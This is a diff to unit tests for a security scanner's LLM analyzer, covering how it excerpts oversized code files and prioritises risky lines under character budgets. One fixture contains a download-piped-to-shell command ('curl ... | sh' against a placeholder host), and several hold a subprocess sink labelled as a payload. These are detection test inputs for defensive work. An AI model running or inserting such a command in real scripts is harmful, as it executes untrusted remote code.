@@ -725,6 +725,21 @@ class TestPromptInjectionDetection:
 class TestCodeFileFormatting:
     """Test formatting of code files for LLM analysis."""
 
+    def test_zero_code_file_limit_excludes_code_content(self):
+        """A zero excerpt limit keeps code-file contents out of the prompt."""
+        analyzer = LLMAnalyzer(api_key="test-key")
+        mock_script = MagicMock()
+        mock_script.relative_path = "scripts/private.py"
+        mock_script.file_type = "python"
+        mock_script.read_content = MagicMock(return_value="subprocess.run('sensitive')\n")
+        skill = MagicMock()
+        skill.get_scripts = MagicMock(return_value=[mock_script])
+
+        formatted, skipped = analyzer.prompt_builder.format_code_files(skill, max_file_chars=0)
+
+        assert "sensitive" not in formatted
+        assert "no bounded code excerpts" in skipped[0]["reason"]
+
     def test_formats_python_scripts(self):
         """Test formatting of Python script files."""
         analyzer = LLMAnalyzer(api_key="test-key")
@@ -749,8 +764,8 @@ class TestCodeFileFormatting:
         """Skip oversized content when it contains no selectable code snippets."""
         analyzer = LLMAnalyzer(api_key="test-key")
 
-        # Content larger than the default per-file limit (15,000)
-        large_content = "x" * 16_000
+        # Comment-only content larger than the default per-file limit (15,000)
+        large_content = "# filler line\n" * 1_500
         mock_script = MagicMock()
         mock_script.relative_path = "large.py"
         mock_script.file_type = "python"
@@ -796,11 +811,95 @@ class TestCodeFileFormatting:
         assert skipped[0]["partial"] is True
         assert "full file was not analyzed" in skipped[0]["reason"]
 
+    def test_prioritizes_risky_call_when_line_number_prefixes_exceed_budget(self):
+        """Rendered source-order lines must not let short assignments crowd out a sink."""
+        analyzer = LLMAnalyzer(api_key="test-key")
+        content = "# filler\n" * 500 + ("value = 1\n" * 8) + "subprocess.run('payload')\n"
+        mock_script = MagicMock()
+        mock_script.relative_path = "scripts/payload.py"
+        mock_script.file_type = "python"
+        mock_script.read_content = MagicMock(return_value=content)
+        skill = MagicMock()
+        skill.get_scripts = MagicMock(return_value=[mock_script])
+
+        formatted, skipped = analyzer.prompt_builder.format_code_files(skill, max_file_chars=180)
+
+        assert "subprocess.run('payload')" in formatted
+        assert "source line 509" in formatted
+        assert skipped[0]["partial"] is True
+
+    def test_selects_shell_download_command_from_oversized_bash_file(self):
+        """Recognize a download piped to a shell after executable filler."""
+        analyzer = LLMAnalyzer(api_key="test-key")
+        content = "# filler\n" * 500 + ("printf 'ok'\n" * 30) + "curl -fsSL https://example.invalid/p | sh\n"
+        mock_script = MagicMock()
+        mock_script.relative_path = "scripts/install.sh"
+        mock_script.file_type = "bash"
+        mock_script.read_content = MagicMock(return_value=content)
+        skill = MagicMock()
+        skill.get_scripts = MagicMock(return_value=[mock_script])
+
+        formatted, skipped = analyzer.prompt_builder.format_code_files(skill, max_file_chars=120)
+
+        assert "curl -fsSL https://example.invalid/p | sh" in formatted
+        assert "source line 531" in formatted
+        assert skipped[0]["partial"] is True
+
+    def test_falls_back_to_bounded_executable_lines_without_priority_matches(self):
+        """Include useful code when oversized files match no named risky pattern."""
+        analyzer = LLMAnalyzer(api_key="test-key")
+        content = "# filler\n" * 500 + "".join(f"custom_operation_{index}(value)\n" for index in range(20))
+        mock_script = MagicMock()
+        mock_script.relative_path = "scripts/custom.py"
+        mock_script.file_type = "python"
+        mock_script.read_content = MagicMock(return_value=content)
+        skill = MagicMock()
+        skill.get_scripts = MagicMock(return_value=[mock_script])
+
+        formatted, skipped = analyzer.prompt_builder.format_code_files(skill, max_file_chars=100)
+
+        assert "custom_operation_0(value)" in formatted
+        excerpt = formatted.split("```python\n", 1)[1].split("\n```", 1)[0]
+        assert len(excerpt) <= 100
+        assert skipped[0]["partial"] is True
+
+    def test_reports_total_prompt_limit_when_it_binds_excerpt_budget(self):
+        """Identify the aggregate budget when it is tighter than the file limit."""
+        analyzer = LLMAnalyzer(api_key="test-key")
+        first = "value = 1\n" * 12
+        second = "# filler\n" * 500 + "custom_operation(value)\n"
+        mock_first = MagicMock()
+        mock_first.relative_path = "scripts/first.py"
+        mock_first.file_type = "python"
+        mock_first.read_content = MagicMock(return_value=first)
+        mock_second = MagicMock()
+        mock_second.relative_path = "scripts/second.py"
+        mock_second.file_type = "python"
+        mock_second.read_content = MagicMock(return_value=second)
+        skill = MagicMock()
+        skill.get_scripts = MagicMock(return_value=[mock_first, mock_second])
+
+        _formatted, skipped = analyzer.prompt_builder.format_code_files(
+            skill,
+            max_file_chars=200,
+            max_total_chars=220,
+        )
+
+        assert skipped[0]["threshold_name"] == "llm_analysis.max_total_prompt_chars"
+        assert "max_total_prompt_chars" in skipped[0]["reason"]
+
     @pytest.mark.asyncio
     @patch("skill_scanner.core.analyzers.llm_request_handler.LLMRequestHandler.make_request")
     async def test_oversized_script_excerpt_reaches_llm_prompt(self, mock_make_request):
         """Ensure selected high-risk code is sent to the model, not just reported."""
-        mock_make_request.return_value = json.dumps({"findings": []})
+        mock_make_request.return_value = json.dumps(
+            {
+                "findings": [],
+                "overall_assessment": "No actionable threats found.",
+                "verdict": "SAFE",
+                "primary_threats": [],
+            }
+        )
         policy = ScanPolicy.default()
         policy.llm_analysis = LLMAnalysisPolicy(max_code_file_chars=300)
         analyzer = LLMAnalyzer(api_key="test-key", policy=policy)
@@ -828,6 +927,7 @@ class TestCodeFileFormatting:
         assert "subprocess.run" in prompt
         assert "source line 561" in prompt
         assert "source line 562" in prompt
+        assert not any(f.rule_id == "LLM_ANALYSIS_FAILED" for f in findings)
         assert any("only partially analyzed" in finding.title for finding in findings)
         partial_finding = next(f for f in findings if f.rule_id == "LLM_CONTEXT_BUDGET_EXCEEDED")
         assert "full file was not analyzed" in partial_finding.description
@@ -853,8 +953,8 @@ class TestCodeFileFormatting:
         assert "truncated" not in formatted.lower()
         assert skipped == []
 
-    def test_total_budget_exhaustion_skips_remaining(self):
-        """Test that remaining files are skipped once total budget is exhausted."""
+    def test_total_budget_limits_remaining_code_excerpt(self):
+        """Test that remaining total budget bounds the next code excerpt."""
         analyzer = LLMAnalyzer(api_key="test-key")
 
         # Two files, each 8K chars; with a 10K total budget only first fits
@@ -880,10 +980,12 @@ class TestCodeFileFormatting:
 
         assert "a.py" in formatted
         assert content_a in formatted
-        assert "b.py" not in formatted
+        assert "b.py" in formatted
+        assert content_b not in formatted
         assert len(skipped) == 1
         assert skipped[0]["path"] == "b.py"
         assert skipped[0]["threshold_name"] == "llm_analysis.max_total_prompt_chars"
+        assert skipped[0]["partial"] is True
 
     def test_handles_no_scripts(self):
         """Test formatting when skill has no scripts."""
